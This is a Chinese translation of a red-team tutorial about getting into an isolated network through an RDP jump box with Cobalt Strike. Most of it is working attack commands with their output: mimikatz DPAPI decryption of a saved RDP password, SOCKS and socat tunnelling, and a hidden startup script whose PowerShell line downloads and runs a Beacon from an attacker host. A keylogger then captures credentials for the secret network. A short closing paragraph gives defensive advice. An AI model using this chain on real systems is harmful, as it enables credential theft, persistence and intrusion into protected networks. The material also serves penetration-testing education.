> 原文链接: https://www.anquanke.com//post/id/86771 


# 【技术分享】如何利用RDP跳转主机进入隔离网络


                                阅读量   
                                **168521**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：rastamouse.me
                                <br>原文地址：[https://rastamouse.me/2017/08/jumping-network-segregation-with-rdp/](https://rastamouse.me/2017/08/jumping-network-segregation-with-rdp/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p2.ssl.qhimg.com/t0143b5c2b0c1b7fa43.jpg)](https://p2.ssl.qhimg.com/t0143b5c2b0c1b7fa43.jpg)

译者：[興趣使然的小胃](http://bobao.360.cn/member/contribute?uid=2819002922)

预估稿费：130RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



**一、前言**

****

本文中我们介绍了如何使用**Cobalt Strike**，通过RDP跳转主机（Jump Box）进入隔离或受保护网络中。

网络拓扑如下所示：

[![](https://p2.ssl.qhimg.com/t01a5983c56393356bd.jpg)](https://p2.ssl.qhimg.com/t01a5983c56393356bd.jpg)

在这个拓扑环境中：

LAN为扁平化结构，由工作站及服务器组成。

包括RDP跳转节点在内的某些服务器无法外连到互联网。

工作站可以通过代理访问互联网。

RDP跳转主机是LAN中唯一可以与“秘密网络（Secret Network）”通信的主机，通信端口仅限于3389端口。

这两个网络处于不同的森林（forest）中，分别为rasta-lan.local以及secret-lan.local。

LAN的地址为**10.0.0.0/16**，秘密网络地址为**172.16.0.0/24**。

在这种场景下，攻击者的任务是在攻击主机（Windows 10）上打开远程桌面连接应用，通过RDP直接登录到秘密网络中的目标服务器。

<br>

**二、突破口**

****

我们已拿下了名为rasta_mouse的一名用户，该用户为普通域用户（Domain Users）。我们可以查询目标服务器，探测哪些用户/组可以使用RDP协议。



```
beacon&gt; powerpick Get-NetLocalGroup -ComputerName RDP01 -GroupName "Remote Desktop Users"
ComputerName : RDP01
AccountName : rasta-lan.local/Jump Box Users 
IsDomain : True 
IsGroup : True 
SID : S-1-5-21-2294392343-2072776990-791666979-1106
```

使用如下命令查询哪些用户属于“Jump Box Users”组：



```
beacon&gt; powerpick Get-NetGroupMember -GroupName "Jump Box Users"
GroupDomain : rasta-lan.local 
GroupName : Jump Box Users 
MemberDomain : rasta-lan.local 
MemberName : rastamouseadm 
MemberSID : S-1-5-21-2294392343-2072776990-791666979-1107 
IsGroup : False 
MemberDN : CN=Rasta Mouse (Admin),CN=Users,DC=rasta-lan,DC=local
```

从结果中可知，rastamouse有两个独立的账户，这表明我们需要获取rastamouse_adm的凭据才能继续攻击。下面我会介绍两种可能行之有效的方法。

<br>

**三、Credential Manager &amp; DPAPI**

****

如果目标用户选择了保存RDP凭据，并且我们也具备SeDebugPrivilege权限，这是提取用户凭据最为理想的场景。

我们可以在凭据管理器（Credential Manager）界面中查看Windows凭据，如下所示：

[![](https://p2.ssl.qhimg.com/t013bb247116f862b17.jpg)](https://p2.ssl.qhimg.com/t013bb247116f862b17.jpg)

当然我们也可以使用命令行来查询：



```
beacon&gt; shell vaultcmd /listcreds:"Windows Credentials" /all
Credentials in vault: Windows Credentials
Credential schema: Windows Domain Password Credential Resource: Domain:target=TERMSRV/rdp01 Identity: LANrastamouseadm Hidden: No Roaming: No Property (schema element id,value): (100,2)
```

具体的凭据信息保存在用户目录中：

```
C:Users&lt;username&gt;AppDataLocalMicrosoftCredentials*
```

可以使用如下命令进行查询：



```
beacon&gt; powerpick Get-ChildItem C:Usersrasta_mouseAppDataLocalMicrosoftCredentials -Force
Directory: C:Usersrasta_mouseAppDataLocalMicrosoftCredentials
Mode LastWriteTime Length Name
-a-hs- 02/09/2017 13:37 412 2647629F5AA74CD934ECD2F88D64ECD0 -a-hs- 30/08/2017 19:28 11204 DFBE70A7E5CC19A398EBF1B96859CE5D
```

现在，我们可以具体分析一下**C:Usersrasta_mouseAppDataLocalMicrosoftCredentials2647629F5AA74CD934ECD2F88D64ECD0**这个文件：



```
beacon&gt; mimikatz dpapi::cred /in:C:Usersrasta_mouseAppDataLocalMicrosoftCredentials2647629F5AA74CD934ECD2F88D64ECD0
BLOB dwVersion : 00000001 - 1 guidProvider : `{`df9d8cd0-1501-11d1-8c7a-00c04fc297eb`}` dwMasterKeyVersion : 00000001 - 1 guidMasterKey : `{`6515c6ef-60cd-4563-a3d5-3d70a6bc6992`}` dwFlags : 20000000 - 536870912 (system ; ) dwDescriptionLen : 00000030 - 48 szDescription : Local Credential Data
algCrypt : 00006603 - 26115 (CALG3DES) dwAlgCryptLen : 000000c0 - 192 dwSaltLen : 00000010 - 16 pbSalt : be072ec0f54a6ceaffd09fe2275d72f9 dwHmacKeyLen : 00000000 - 0 pbHmackKey : algHash : 00008004 - 32772 (CALGSHA1) dwAlgHashLen : 000000a0 - 160 dwHmac2KeyLen : 00000010 - 16 pbHmack2Key : a3579f9e295013432807757d3bcdf82e dwDataLen : 000000d8 - 216 pbData : 0bad8cb788a364061fa1eff57c3cbc83c8aa198c95537f66f2f973c8fe5e7210626c58423b84b55f604cff2b23165b690ad7fa7ad03d80051cb7c1a0e987f36586ede1bd7ff7e2b9f1d3cbc4b8f1b8557ab1be3402d3bfe39b1682353504ff156615b44ea83aa173c3f7830b65bf9202d823932ca69413fcb8bca1a76893c7cbab7e0ee0bbe9269a8b9f65e88e099334177be15cf977a44b77ba6e829c89303ef4764f5fd661e722c7508ad2e01a41f9cd079fc7ce5a8dba90c94a2314941674ad47567bd9c980548f809fe72ce4895b6a56cb9148c47afb dwSignLen : 00000014 - 20 pbSign : 43559a2b2e9b11bc4b56828a1d2ece489c9dfd52
```

其中我们需要注意两个字段：pbData以及guidMasterKey。pbData是我们需要解密的字段，而guidMasterKey是解密时要用到的关键值。

LSASS中很有可能在缓存中保存了这个关键值，因为我们具有SeDebugPrivilege权限，我们可以提升权限，获取相应信息。

```
beacon&gt; mimikatz !sekurlsa::dpapi
```

在一大堆输出结果中，我们找到了想要的GUID以及MasterKey值：

```
[00000000] * GUID : `{`6515c6ef-60cd-4563-a3d5-3d70a6bc6992`}` * Time : 02/09/2017 13:37:51 * MasterKey : 95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b * sha1(key) : 89f35906909d78c84ba64af38a2bd0d1d96a0726
```

如果我们在交互模式下运行mimikatz，程序会将这些值自动添加到dpapi缓存中，当我们准备解密凭据时，mimikatz就会使用这些值。但如果我们通过Cobalt Strike运行mimikatz，我们无法保持在同一个会话中（或者已经有人找到保持会话的方法，但我还不知道），因此，我们需要手动使用这个值。



```
beacon&gt; mimikatz dpapi::cred /in:C:Usersrasta_mouseAppDataLocalMicrosoftCredentials2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
Decrypting Credential: * masterkey : 95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b CREDENTIAL credFlags : 00000030 - 48 credSize : 000000d2 - 210 credUnk0 : 00000000 - 0
Type : 00000002 - 2 - domainpassword Flags : 00000000 - 0 LastWritten : 02/09/2017 12:37:44 unkFlagsOrSize : 00000030 - 48 Persist : 00000002 - 2 - localmachine AttributeCount : 00000000 - 0 unk0 : 00000000 - 0 unk1 : 00000000 - 0 TargetName : Domain:target=TERMSRV/rdp01 UnkData : (null) Comment : (null) TargetAlias : (null) UserName : LANrastamouseadm CredentialBlob : Sup3rAw3s0m3Passw0rd! &lt;--- BOOM! Attributes : 0
```



**四、RDP01**

****

现在，我们可以使用这些凭据通过RDP登录到跳转主机，提醒一下，我们的目标是直接在攻击主机上完成这个攻击过程。因此，我们先要在当前Beacon上搭建一个SOCKS代理服务。



```
beacon&gt; socks 1337 
[+] started SOCKS4a server on: 1337
```

通过SSH登录Teamserver，如果尚未安装socat以及proxychains，就安装这两个工具。

修改**proxychains.conf**配置文件，使用127.0.0.1地址以及1337端口。

通过**proxychains**运行socat：

```
proxychains socat TCP4-LISTEN:3389,fork TCP4:10.0.0.100:3389
```

这样一来，Teamserver会在3389端口上监听，所有访问该端口的流量会经过代理，被重定向10.0.0.100的3389端口。

注意：Beacon的SOCKS代理没有使用验证信息，因此请确保Teamserver的防火墙不会将相应端口暴露在整个互联网上。

现在，我们可以使用RDP协议访问Teamserver的IP地址，经过跳转后，最终登录的是跳转主机。

[![](https://p3.ssl.qhimg.com/t012139c0bed95b8c08.jpg)](https://p3.ssl.qhimg.com/t012139c0bed95b8c08.jpg)



**五、持久化**

****

现在我们已经能够访问这台服务器，我们需要设置持久化机制，以便“真正的”rastamouseadm用户登录时，我们能拿到一个SMB Beacon。

简单的操作步骤如下所示：

**创建一个stageless类型的PowerShell SMB Beacon载荷。**

**在Teamserver上的/smb路径托管这个payload。**

**在当前beacon中创建一个反弹型端口转发：**

```
rportfwd 8080 178.62.56.134 80
```

**使用如下内容创建启动脚本**，脚本路径为**C:Usersrasta_mouse_admAppDataRoamingMicrosoftWindowsStart MenuProgramsStartupstartup.bat**

```
powershell.exe -nop -w hidden -c "iex ((new-object net.webclient).downloadstring('http://10.0.1.200:8080/smb'))"
```

**注销RDP会话**

备注：如果你可以在该服务器上提升权限、运行或注入到SYSTEM进程中，那么你不必依赖RDP会话来运行Beacon。

当我们的目标用户登录时，我们可以在日志中看到命中信息：

```
09/02 14:19:45 visit from: 178.62.56.134 Request: GET /smb page Serves /opt/cobaltstrike/uploads/beacon.ps1 null
```

现在我们可以link到这个beacon。



```
beacon&gt; link 10.0.0.100 
[+] established link to child beacon: 10.0.0.100
```

[![](https://p0.ssl.qhimg.com/t01c6529f111ca50f1b.jpg)](https://p0.ssl.qhimg.com/t01c6529f111ca50f1b.jpg)

<br>

**六、跳转到秘密网络**

****

以跳转主机为据点，我们需要掌握进入秘密网络的具体方法。

其实我们可以用键盘记录器窃取所需的信息，如下所示：



```
beacon&gt; keylogger 1816 x64
Start menu
remo
Remote Desktop Connection
172.16.0.10
Windows Security
SECRETrasta_mouse[tab]Passw0rd!
```

接下来执行如下操作：

停止Beacon上的SOCKS代理服务，同时也停止Teamserver上的proxychains、socat。

在跳转主机上开启新的SOCKS代理服务（可以使用相同的端口）。

在Teamserver上，运行

```
proxychains socat TCP4-LISTEN:3389,fork TCP4:172.16.0.10:3389
```

命令。

与前面的操作一样，使用RDP访问Teamserver IP，最终我们就可以登录到秘密网络中。

[![](https://p1.ssl.qhimg.com/t01c04f40df5a44737a.jpg)](https://p1.ssl.qhimg.com/t01c04f40df5a44737a.jpg)



**七、总结**

****

简而言之，永远不要保存RDP凭据信息，始终在跳转主机上使用双因素认证，DPAPI并不能提供足够的防护。


